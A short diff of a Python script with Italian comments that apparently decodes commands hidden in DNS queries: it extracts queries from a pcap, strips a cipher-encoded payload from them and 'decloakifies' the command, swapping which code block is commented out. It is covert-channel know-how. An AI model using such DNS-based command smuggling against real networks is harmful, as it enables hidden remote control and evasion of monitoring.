@@ -85,9 +85,9 @@ def remove_dup_lines(file_input, file_output):
 
 if __name__ == "__main__":
     print("Server in attesa di richieste...")
-    while True:
-        receive_command()
-"""     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
+    """     while True:
+        receive_command() """
+    dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
     cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
     
     cloaked_command = remove_dup_lines(cloakedFile, "_"+cloakedFile)
@@ -104,7 +104,6 @@ if __name__ == "__main__":
     # Decloakificare il comando
     print("Decloakifying...")
     Decloakify('cloaked.payload', cipher, decloaked_command)
-     """
 
         
 
